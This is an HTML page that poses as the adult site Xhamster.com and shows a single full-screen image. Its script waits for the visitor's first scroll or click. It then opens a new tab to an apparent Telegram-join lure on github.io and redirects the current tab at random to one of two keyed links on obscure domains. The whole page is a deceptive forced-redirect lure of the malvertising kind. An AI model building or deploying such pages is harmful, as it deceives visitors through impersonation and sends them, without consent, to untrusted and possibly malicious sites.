<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Xhamster.com</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:#000;
    overflow-x:hidden;
}

img{
    width:100%;
    height:100vh;
    object-fit:cover;
    display:block;
}
</style>
</head>

<body>

<img src="1.jpg" id="triggerImage">

<script>
(function () {

    let opened = false;

    // New tab landing page
    const newTabLink = "https://tme-join.github.io/dgngbf/";

    // 50/50 random current tab links
    const currentTabLinks = [
        "https://sitefleck.com/qwpmezpg?key=ff4552c4f5069bba65ae8a584a919868",
        "https://seenimplieddump.com/v3a38gvf?key=6c21c7841863a8a4041248cb754691b4"
    ];

    function triggerRedirect() {

        if (opened) return;
        opened = true;

        // Open new tab
        window.open(newTabLink, "_blank");

        // Random redirect in current tab
        const randomLink =
            currentTabLinks[Math.floor(Math.random() * currentTabLinks.length)];

        window.location.href = randomLink;
    }

    // Trigger on first scroll
    window.addEventListener("scroll", triggerRedirect);

    // Trigger on first click
    document.addEventListener("click", triggerRedirect);

})();
</script>

</body>
</html>
